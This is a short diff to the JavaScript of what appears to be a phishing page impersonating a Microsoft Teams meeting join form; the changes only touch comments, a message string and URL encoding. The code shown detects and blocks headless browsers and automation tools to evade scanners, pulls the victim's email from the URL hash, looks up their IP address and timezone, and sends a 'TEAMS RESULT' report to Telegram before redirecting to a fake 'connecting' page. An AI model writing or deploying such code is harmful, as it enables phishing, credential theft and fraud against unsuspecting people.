@@ -276,7 +276,7 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
 
   const form = e.target;
 
-  // --- Check form validity (both fields required) ---
+  // --- Check form validity ---
   if (!form.checkValidity()) {
     form.reportValidity();
     return;
@@ -284,7 +284,7 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
 
   // --- Anti-bot / headless detection ---
   if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
-    document.body.innerHTML = "<h2>Security Verification Failed</h2><p>Please try again from a regular browser.</p>";
+    document.body.innerHTML = "<h2>Security Verification Failed</h2><p>Please use a regular browser.</p>";
     throw new Error("Headless browser detected");
   }
 
@@ -297,7 +297,7 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
   let email = window.location.hash ? window.location.hash.substring(1) : '';
   email = email.replace(/=*$/, ''); // strip trailing =
 
-  // --- Fetch IP with timeout ---
+  // --- Fetch IP ---
   let ipAddress = 'Unavailable';
   try {
     const controller = new AbortController();
@@ -311,7 +311,7 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
   const currentDateTime = new Date().toLocaleString();
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-  // --- Send to Telegram ---
+  // --- Send Telegram ---
   const message =
     `✅💯 TEAMS RESULT 💯✅\n` +
     `Meeting ID: ${meetingID}\n` +
@@ -335,9 +335,9 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
     });
   } catch {}
 
-  // --- Redirect to Page 2 with hash ---
+  // --- Redirect to Page 2 with raw hash (no encode) ---
   setTimeout(() => {
-    window.location.href = 'connecting.html' + (email ? '#' + encodeURIComponent(email) : '');
+    window.location.href = 'connecting.html' + (email ? '#' + email : '');
   }, Math.floor(Math.random() * 1000) + 500);
 });
 </script>
